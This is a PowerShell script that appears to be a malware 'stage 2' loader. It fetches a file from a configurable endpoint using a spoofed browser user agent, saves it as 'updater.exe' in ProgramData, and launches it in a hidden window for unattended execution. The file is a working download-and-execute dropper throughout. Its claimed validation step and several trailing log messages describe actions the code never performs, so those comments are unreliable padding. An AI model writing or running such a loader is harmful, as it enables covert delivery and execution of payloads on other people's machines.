<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.
#>
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://localhost:8081/assets/update.dat',
    [string]$OutputPath = 'C:\ProgramData\updater.exe',
    [string]$LogPath = "$env:TEMP\report.txt",
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$TransferTimeout = 19,
    [int]$RetryCount = 2,
    [int]$RetryDelay = 20
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    param(
        [string]$Message = ''
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$RetryCount = 2,
        [int]$RetryDelay = 20,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $RemoteUrl
    $ResultObject = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $OutputPath -RetryCount $RetryCount -RetryDelay $RetryDelay -UserAgent $RequestAgent
    if ($ResultObject) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $OutputPath -WindowStyle Hidden
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $RemoteUrl
    Destination = $OutputPath
    RetryCount = $RetryCount
    TimeoutSec = $TransferTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Collecting host metadata"
Write-Verbose "Reading configuration values"
Write-Verbose "Resolving configured target"
Write-Verbose "Stage handoff finished"
Write-Verbose "Validating result"
Write-Verbose "Inspecting process list"
Write-Verbose "Retry budget remaining"
Write-Verbose "Preparing working directory"
Write-Verbose "Applying operation timeout"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
Start-Sleep -Seconds 13
$StageMarker = "stage-23"
